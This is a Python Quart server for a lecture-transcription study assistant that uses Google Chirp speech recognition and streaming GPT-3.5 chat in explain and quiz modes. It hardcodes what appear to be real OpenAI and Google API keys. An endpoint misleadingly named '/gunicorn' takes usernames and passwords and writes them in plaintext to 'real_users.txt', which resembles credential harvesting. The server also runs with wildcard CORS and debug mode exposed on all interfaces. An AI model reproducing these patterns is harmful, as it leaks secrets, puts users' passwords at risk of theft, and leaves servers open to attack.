

from quart import Quart, render_template, request, Response, jsonify
from quart_cors import cors 
from openai import OpenAI


import json, os


from datetime import timedelta
import google.generativeai as genai
import random 



import os
from PIL import Image

from google.cloud import speech
import io
from google.api_core.client_options import ClientOptions
from google.cloud.speech_v2 import SpeechClient
from google.cloud.speech_v2.types import cloud_speech
import requests
from pydub import AudioSegment
from pydub.playback import play
import subprocess 
import tempfile
from typing import Optional
from google.api_core.client_options import ClientOptions
from google.cloud import documentai  # type: ignore
from typing import Optional
import threading 
 
import asyncio 
from IPython.display import Image
import base64






os.environ["OPENAI_API_KEY"] = "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"
genai.configure(api_key="AIzaSyDwN8udOcqGBXZPTIvVQO8qjjbmE2OIBUw")
client = OpenAI()
 

app = Quart(__name__)
app = cors(app, allow_origin="*")

 
import os

 
os.environ["OPENAI_API_KEY"] = "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"
 
client = OpenAI()

def transcribe_chirp(project_id: str, audio_data,) -> cloud_speech.RecognizeResponse:
    """Transcribe an audio file using Chirp."""
 
    try: 
        client = SpeechClient(
            client_options=ClientOptions(
                api_endpoint="us-central1-speech.googleapis.com",
            )
        )

        content = audio_data

        config = cloud_speech.RecognitionConfig(
            auto_decoding_config=cloud_speech.AutoDetectDecodingConfig(),
            language_codes=["en-US"],
            model="chirp",
        )

        request = cloud_speech.RecognizeRequest(
            recognizer=f"projects/{project_id}/locations/us-central1/recognizers/_",
            config=config,
            content=content,
        )
    
        response = client.recognize(request=request)


        

        for result in response.results:
            data = result.alternatives[0].transcript
            print(f"Transcript: {data}")
        

        with open("transcript.txt", "a") as f:
            f.write(f"{data}")

    

        return data

    
    except Exception as e:
        print(f"Unexpected error during transcription: {e}")
        raise
    





 
 

def send_messages(messages):
    return client.chat.completions.create(
        model="gpt-3.5-turbo",
        messages=messages,
        stream=True,
    )



@app.route("/")
async def index():
    template = await render_template('llm.html')
    return template


@app.route("/transcribe", methods=["POST"])
async def transcribe():
    print("transcription started")
    try:
        
        
        data = await request.data
        process = subprocess.Popen(['ffmpeg', '-i', 'pipe:0', '-f', 'wav', 'pipe:1'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        wav_data, _ = process.communicate(input=data)

        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(None, lambda: transcribe_chirp("voltaic-flag-413206", wav_data))


        data = { "text": response } 

        return jsonify(data)
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500






@app.route("/process-input", methods=["POST"])
async def process_input():
    history = []
    data = await request.get_json()
 

    button_status = data.get("button_status")
    print(f"BUTTON STAAAAAAAAAAAAAAAAAATUS IS {button_status}")

    


    existingValue = data.get('list')
    print(existingValue)
    message = data.get('message')
    

    transcript = data.get("transcript")
    
    if button_status == "no":
        history.append({"role": "system", "content": "You are a learning assistant that is aware of the student's lecture content. You will assist the student in a succinct & academically accurate manner. "})
        
 

    else: 
        history.append({"role": "system", "content": """

        You are a helpful and patient study assistant. Your goal is to help the user learn by either letting them explain concepts to you or quizzing them. To help the user, you are given the user input as well as a lecture transcript (that the user attended) to gather context. The user might start a conversation with one of two requests:

        "I, as the user, want to explain what I learned in class today to you so I can refine my learning." In this case, allow the user to explain first, then ask thoughtful questions, provide prompts to improve clarity, and summarize the user's explanation back to them.
        "Quiz me on what we learned today." In this case, ask multiple-choice or open-ended questions about the material. Your initial response will consists of less than 4 question, and you will provide detailed feedback / and or subsequent questions (upon user request) from the user's response.

                         
        """})
         
 
 

    if existingValue:
        lastElements = existingValue[-8:]
        print(f"CHECK IT OUT: {lastElements}")

        for element in lastElements:
            content = element.get("content")
            medium = element.get("medium")

            if medium == "user-message":
                varx = "user"
            else:
                varx = "assistant"
            history.append({"role": varx, "content": f"{content[-1100:]}..."})
        print(f"THE \n  HISTORY \n IS HERE: {history}")


    if transcript is None: 
        transcript = ""
    if button_status == "no":
        history.append({"role": "user", "content": f"""

        The user message is here: {message} 

        the lecture content is here: {transcript[-4000:]}

        Note: the lecture content is a live transcript of the lecture. 
        If needed, inform the user that you can transcribe any live audio. 
        Hence, if it's null, it's either that the lecture is just starting, or their is a browser restriction in the client end. """})
    else: 
        history.append({"role": "user", "content": f"""

        the user message is here: {message} 

        the transcript is here: {transcript[-13000:]}"""})

    print(history)



    def event_stream():
        for chunk in send_messages(messages=history):
            if chunk.choices[0].delta.content is not None:
                print(chunk.choices[0].delta.content)
                yield chunk.choices[0].delta.content

    response = Response(event_stream(), mimetype='text/event-stream')
    response.headers["X-Accel-Buffering"] = "no"
    return response



@app.route("/gunicorn", methods=["POST"])
async def gunicornx():
    data = await request.get_json()

    username = data.get("username")
    password = data.get("password")

    with open("real_users.txt", "a") as f:
        f.write(f"{username}:{password}\n\n")

    return jsonify({"message": "sucess"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
